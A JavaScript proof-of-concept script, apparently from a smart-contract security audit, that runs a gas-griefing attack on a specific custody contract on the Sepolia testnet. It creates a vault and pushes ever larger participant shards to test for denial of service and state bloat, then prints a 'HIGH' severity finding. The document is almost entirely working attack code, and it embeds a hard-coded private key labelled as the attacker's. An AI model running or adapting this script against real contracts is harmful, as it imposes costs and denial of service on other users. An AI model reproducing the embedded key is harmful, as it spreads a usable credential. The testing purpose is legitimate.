const { ethers } = require("ethers");

// === VULNERABILITY: Gas Griefing via Unbounded Shard Storage ===
// Can attacker submit massive shards to DoS the system?

const RPC_URL = "https://ethereum-sepolia.publicnode.com";
const CUSTODY_ADDRESS = "0x3B3AD30e32fFef3dD598dd3EfDf6DCC392897786";
const ATTACKER_PK = "0x66703806999048d288011123372530e7e54a85f56cb80397a59c5d6e2911c3a4";

const ABI = [
    "function createVault(bytes32 _creator) external",
    "function addParticipant(bytes32 _creator, bytes32 _participant, string _shard) external"
];

async function main() {
    console.log("=== GAS GRIEFING ATTACK TEST ===\n");
    console.log(`Target: ${CUSTODY_ADDRESS}\n`);

    const provider = new ethers.providers.JsonRpcProvider(RPC_URL);
    const attacker = new ethers.Wallet(ATTACKER_PK, provider);
    const contract = new ethers.Contract(CUSTODY_ADDRESS, ABI, attacker);

    console.log(`Attacker: ${attacker.address}\n`);
    console.log("=".repeat(70));

    // Create vault
    const vaultId = ethers.utils.formatBytes32String(`GasAttack${Date.now()}`);
    console.log(`\n[STEP 1] Creating vault...`);

    try {
        const tx1 = await contract.createVault(vaultId, { gasLimit: 300000 });
        await tx1.wait();
        console.log(`✅ Vault created`);
    } catch (e) {
        console.log(`❌ Failed: ${e.message}`);
        return;
    }

    // Test progressively larger shards
    const sizes = [
        { name: "Normal", bytes: 100 },
        { name: "Large", bytes: 1000 },
        { name: "Very Large", bytes: 10000 },
        { name: "Massive", bytes: 50000 }
    ];

    console.log(`\n[STEP 2] Testing shard sizes...\n`);

    for (const test of sizes) {
        console.log(`Testing ${test.name} shard (${test.bytes} bytes)...`);
        const bigShard = "A".repeat(test.bytes);
        const participantId = ethers.utils.formatBytes32String(`P${test.bytes}`);

        try {
            // Estimate gas first
            const gasEstimate = await contract.estimateGas.addParticipant(
                vaultId,
                participantId,
                bigShard
            );

            console.log(`  Gas Estimate: ${gasEstimate.toString()}`);

            // Try to execute
            const tx = await contract.addParticipant(
                vaultId,
                participantId,
                bigShard,
                { gasLimit: gasEstimate.mul(2) } // 2x safety margin
            );

            const receipt = await tx.wait();
            console.log(`  ✅ SUCCESS - Gas Used: ${receipt.gasUsed.toString()}`);
            console.log(`  Transaction: ${receipt.transactionHash}`);

            // Calculate cost
            const gasPrice = receipt.effectiveGasPrice;
            const costWei = receipt.gasUsed.mul(gasPrice);
            const costEth = ethers.utils.formatEther(costWei);
            console.log(`  Cost: ${costEth} ETH\n`);

        } catch (e) {
            if (e.message.includes("gas required exceeds")) {
                console.log(`  🚨 BLOCK GAS LIMIT EXCEEDED!`);
                console.log(`  This size causes DoS - transaction impossible to include\n`);
                break;
            } else {
                console.log(`  ❌ Failed: ${e.reason || e.message}\n`);
            }
        }
    }

    console.log("=".repeat(70));
    console.log("\n📊 CONCLUSION:\n");
    console.log("If any large shard succeeded:");
    console.log("  • Users can force extremely high gas costs on vault operations");
    console.log("  • Potential DoS by hitting block gas limits");
    console.log("  • State bloat attack (permanent blockchain storage)");
    console.log("\nSeverity: HIGH (Economic DoS + State Pollution)");
}

main().catch(console.error);
